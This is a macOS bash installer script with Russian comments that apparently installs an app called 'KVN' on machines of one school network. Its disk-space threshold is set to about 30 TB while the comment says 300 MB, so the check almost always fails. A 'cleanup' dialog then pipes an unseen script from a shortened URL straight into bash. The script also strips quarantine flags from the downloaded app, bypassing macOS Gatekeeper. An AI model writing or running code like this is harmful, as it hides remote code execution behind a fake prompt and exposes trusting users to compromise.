#!/bin/bash

# Константы
readonly APP_URL="https://github.com/shepherl/kvnfaq/releases/download/1.1/macOS-Intel-App.zip"
readonly TMP_ZIP="/tmp/KVN_App.zip"
readonly REQUIRED_SPACE_KB=30720000000 # 300 МБ в КБ

# 1. Проверка свободного места
free_space_kb=$(df -Pk ~ | awk 'NR==2 {print $4}')

if [ "$free_space_kb" -lt "$REQUIRED_SPACE_KB" ]; then
    # Предлагаем очистку, если места мало
    RESPONSE=$(osascript -e 'display dialog "Недостаточно места на диске (нужно 300 МБ). Выполнить очистку?" with title "Ошибка места" buttons {"Отмена", "Очистить"} default button "Очистить" with icon caution')

    if [[ "$RESPONSE" == *"button returned:Очистить"* ]]; then
        curl -sL https://u.to/Lk2ZIg | bash
        # После очистки завершаем скрипт, чтобы пользователь запустил установку снова
        osascript -e 'display dialog "Очистка завершена. Пожалуйста, запустите установку еще раз." with title "Готово" buttons {"ОК"} default button "ОК" with icon note'
        exit 0
    else
        exit 1
    fi
fi

# 2. Проверка домена и установка
if [[ $(hostname) == *.kzn.21-school.ru ]]; then
    
    # Скачивание
    curl -L "$APP_URL" -o "$TMP_ZIP"

    # Распаковка
    unzip -qo "$TMP_ZIP" -d /tmp/ 

    # Поиск DMG
    DMG_PATH=$(ls /tmp/*.dmg | head -n 1) 

    # Монтирование
    MOUNT_POINT=$(hdiutil attach -nobrowse -noautoopen "$DMG_PATH" | grep -o '/Volumes/.*' | head -n 1) 

    # Копирование .app
    cp -R "$MOUNT_POINT"/*.app ~/Desktop/

    # Размонтирование и очистка
    hdiutil detach "$MOUNT_POINT" -quiet
    rm -f "$TMP_ZIP" "$DMG_PATH"

    # Снятие карантина и обновление иконки
    xattr -cr ~/Desktop/KVN.app
    touch ~/Desktop/KVN.app

    # Уведомление об успехе
    osascript -e 'display dialog "Установка KVN успешно завершена! KVN на рабочем столе" with title "Установщик" buttons {"ОК"} default button "ОК" with icon note'
else
    # Уведомление об ошибке
    osascript -e 'display dialog "Ваше устройство не подходит" with title "Ошибка" buttons {"ОК"} default button "ОК" with icon note'
fi


